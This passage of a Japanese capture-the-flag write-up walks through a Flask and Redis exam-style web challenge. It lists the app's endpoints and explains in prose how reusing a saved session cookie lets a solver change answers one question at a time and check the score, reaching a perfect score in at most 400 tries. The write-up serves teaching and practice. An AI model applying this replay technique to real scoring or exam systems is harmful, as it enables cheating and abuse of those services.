+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">.
+├── docker-compose.yml
+├── redis
+│ ├── Dockerfile
+│ └── redis.conf
+└── service
+├── app.py
+├── Dockerfile
+├── static
+│ ├── fonts
+│ │ └── hymmnos.ttf
+│ ├── img
+│ │ └── towfl.webp
+│ └── js
+│ └── script.js
+├── templates
+│ └── index.html
+└── uwsgi.ini
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>app.py&lt;/code>を確認すると、4つのエンドポイントがあることが分かります。&lt;/p>
+&lt;ul>
+&lt;li>POST &lt;code>/api/start&lt;/code>&lt;/li>
+&lt;li>GET &lt;code>/api/question/&amp;lt;int:qid&amp;gt;&lt;/code>&lt;/li>
+&lt;li>POST &lt;code>/api/submit&lt;/code>&lt;/li>
+&lt;li>GET &lt;code>/api/score&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>それぞれ次のようになっていました。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="nd">@app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/api/start&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">methods&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">api_start&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="s1">&amp;#39;eid&amp;#39;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">eid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;eid&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">eid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;eid&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">urandom&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hex&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;span class="c1"># Create new challenge set&lt;/span>
+&lt;span class="n">db&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">set&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">eid&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">json&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dumps&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="n">new_challenge&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">_&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">)]))&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;status&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;ok&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>/api/start&lt;/code>にPOSTリクエストを送ると、ランダムでsession id(&lt;code>eid&lt;/code>)を付与し、この番号を使って
+redisデータベースに新しい問題を作成します。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="nd">@app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/api/question/&amp;lt;int:qid&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">methods&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;GET&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">api_get_question&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">qid&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">qid&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="n">qid&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;status&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;error&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;reason&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;Invalid parameter.&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;span class="k">elif&lt;/span> &lt;span class="s1">&amp;#39;eid&amp;#39;&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;status&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;error&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;reason&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;Exam has not started yet.&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;span class="c1"># Send challenge information without answers&lt;/span>
+&lt;span class="n">chall&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">json&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">loads&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">db&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;eid&amp;#39;&lt;/span>&lt;span class="p">]))[&lt;/span>&lt;span class="n">qid&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="k">del&lt;/span> &lt;span class="n">chall&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;answers&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="k">del&lt;/span> &lt;span class="n">chall&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;results&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="c1"># challの情報取ってこれるが, answers, resultsが消えたものが返ってくる&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;status&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;ok&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;data&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">chall&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>/api/question/&amp;lt;int:qid&amp;gt;&lt;/code>に1から10までの番号を指定してGETリクエストを送ると、
+指定した大問の問題情報が返ってきます。ただし、答えと結果の情報は消されたものになります。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="nd">@app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/api/submit&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">methods&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">api_submit&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="s1">&amp;#39;eid&amp;#39;&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;status&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;error&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;reason&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;Exam has not started yet.&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">answers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_json&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1"># ここが入力(二次元のリスト)&lt;/span>
+&lt;span class="k">except&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;status&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;error&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;reason&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;Invalid request. 1&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">answers&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="c1"># Get answers&lt;/span>
+&lt;span class="n">eid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;eid&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="n">challs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">json&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">loads&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">db&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">eid&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="nb">isinstance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">answers&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">list&lt;/span>&lt;span class="p">)&lt;/span> \
+&lt;span class="ow">or&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">answers&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">challs&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;status&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;error&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;reason&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;Invalid request. 2&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;span class="c1"># Check answers&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">answers&lt;/span>&lt;span class="p">)):&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="nb">isinstance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">answers&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nb">list&lt;/span>&lt;span class="p">)&lt;/span> \
+&lt;span class="ow">or&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">answers&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">challs&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;answers&amp;#39;&lt;/span>&lt;span class="p">]):&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;status&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;error&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;reason&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;Invalid request.&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">j&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">answers&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">])):&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">challs&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s2">&amp;#34;answers&amp;#34;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">]))&lt;/span>
+&lt;span class="n">challs&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;results&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">answers&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">challs&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;answers&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c1"># resultsに変更を与えているのはここ&lt;/span>
+&lt;span class="c1"># Store information with results&lt;/span>
+&lt;span class="n">db&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">set&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">eid&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">json&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dumps&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">challs&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;status&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;ok&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>/api/submit&lt;/code>でjsonとして10*10のリストをPOSTリクエストにより送ると、このリストとredisに保存された問題情報から答えを比較して結果をchallsのresultsに保存します。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="nd">@app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/api/score&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">methods&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;GET&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">api_score&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="s1">&amp;#39;eid&amp;#39;&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;status&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;error&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;reason&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;Exam has not started yet.&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;span class="c1"># Calculate score&lt;/span>
+&lt;span class="n">challs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">json&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">loads&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">db&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;eid&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span>
+&lt;span class="n">score&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">chall&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">challs&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">chall&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;results&amp;#39;&lt;/span>&lt;span class="p">]:&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="ow">is&lt;/span> &lt;span class="kc">True&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">score&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;span class="c1"># Is he/she worth giving the flag?&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">score&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getenv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;FLAG&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># うまいこと100にすればいいのかな&lt;/span>
+&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;Get perfect score for flag&amp;#34;&lt;/span>
+&lt;span class="c1"># Prevent reply attack&lt;/span>
+&lt;span class="n">flask&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">clear&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;status&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;ok&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;data&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;score&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">score&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;flag&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">flag&lt;/span>&lt;span class="p">}}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>/api/score&lt;/code>にGETリクエストを送ると、redisに保存されたchallsのresultsから正答数を計算し、
+スコア情報と、もしも100点ならflagが、そうでなければ&amp;quot;Get perfect score for flag&amp;quot;が返されます。&lt;/p>
+&lt;p>開催期間中はもしかしたらpythonの等価演算子に何かしらの特性があり、全てのint型のオブジェクトに対して
+透過になるようなオブジェクトがあるのかもしれないと思い調べていましたが違ったようです。&lt;/p>
+&lt;p>まずはじめに、redisデータベースはsession idを用いて各個人の問題情報および結果を管理しています。
+すなわち、session idをユーザー側で管理しておけば、何度も回答を変更して答えの確認をすることができます。
+次に、問題数は10*10で選択肢は全て4つです。通常、スコアが分からないと、$4^{10\times 10} = 1606938044258990275541962092341162602522202993782792835301376$通りになり総当たりは不可能です。しかし、今回はsession idを自分で管理すれば&lt;code>/api/score&lt;/code>によって現在のスコア状況が確認できるため、最悪の場合でも$10\times 10\times 4 = 400$通りで100点を出すことができます。
+そのため、&lt;code>/api/start&lt;/code>を叩いた時点でsession idを保存しておき、このsessionを用いて1問ずつ&lt;code>/api/submit&lt;/code>で回答を変更して&lt;code>/api/score&lt;/code>でスコア確認、1点上がったらその問題は正解なので次の問題ということを100回繰り返せば最悪400通りでflagを得ることができます。&lt;/p>
+&lt;p>今まで考えていませんでしたがTOEICは200問出題されるため、
+回答の組み合わせは$4^{200}$通りもあります。この総当たりの個数を知っていたところでTOEICは回答の再提出と試験中のスコア確認ができないため、結局試験は一発勝負です。（そもそもTOEICのスコアは受験者全員のスコアが分かっていないと計算できない）&lt;/p>
+&lt;h2 id="rev">rev&lt;/h2>
+&lt;h3 id="nande-warmup-rev">nande [warmup, rev]&lt;/h3>
